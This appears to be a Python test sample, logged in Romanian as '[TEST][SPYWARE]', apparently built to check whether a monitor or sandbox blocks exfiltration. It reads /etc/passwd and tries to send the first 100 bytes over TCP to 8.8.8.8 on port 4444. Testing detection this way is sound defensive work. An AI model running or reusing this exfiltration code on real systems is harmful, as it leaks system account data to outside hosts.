import socket
import time
import os

SENSITIVE_FILE = "/etc/passwd"   
EXTERNAL_IP = "8.8.8.8"           
EXTERNAL_PORT = 4444            

def main():
    pid = os.getpid()
    print(f"[TEST][SPYWARE] PID propriu: {pid}")

    print(f"[TEST][SPYWARE] citesc fisierul sensibil: {SENSITIVE_FILE}")
    with open(SENSITIVE_FILE, "r") as f:
        data = f.read()
    print(f"[TEST][SPYWARE] am citit {len(data)} bytes")

    time.sleep(0.5)   

    print(f"[TEST][SPYWARE] incerc conectare catre {EXTERNAL_IP}:{EXTERNAL_PORT}...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)

    try:
        sock.connect((EXTERNAL_IP, EXTERNAL_PORT))
        sock.sendall(data[:100].encode())
        print("[TEST][SPYWARE] date trimise cu succes!")
    except Exception as e:
        print(f"[TEST][SPYWARE] rezultat conexiune (se asteapta blocare sau timeout): {e}")
    finally:
        sock.close()

    print("[TEST][SPYWARE] test terminat")

if __name__ == "__main__":
    main()